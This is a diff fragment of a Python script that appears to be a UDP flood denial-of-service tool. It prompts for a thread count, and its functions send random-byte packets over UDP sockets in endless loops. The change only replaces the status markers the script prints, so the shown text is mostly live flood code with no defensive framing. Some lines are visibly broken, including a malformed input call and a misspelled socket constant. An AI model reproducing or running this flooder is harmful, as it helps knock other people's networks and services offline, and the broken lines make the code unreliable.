@@ -26,7 +26,7 @@ times = int(input(" MASUKKAN THEARDS : "  ;)
 
 def bimzz():
     data = random._urandom(1024)
-    i = random.choice(("[bimzz]","[bimzz]","[bimzz]"))
+    i = random.choice(("[+]","[-]"))
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -39,7 +39,7 @@ def bimzz():
 
 def bimzz2():
     data = random._urandom(16)
-    i = random.choice(("[bimzz]","[bimzz]","[bimzz]"))
+    i = random.choice(("[*]","[!]","[#]"))
     while True:
         try:
             s = socket.socket(socket.AF_INIT, socket.SOCK_DGRAM)
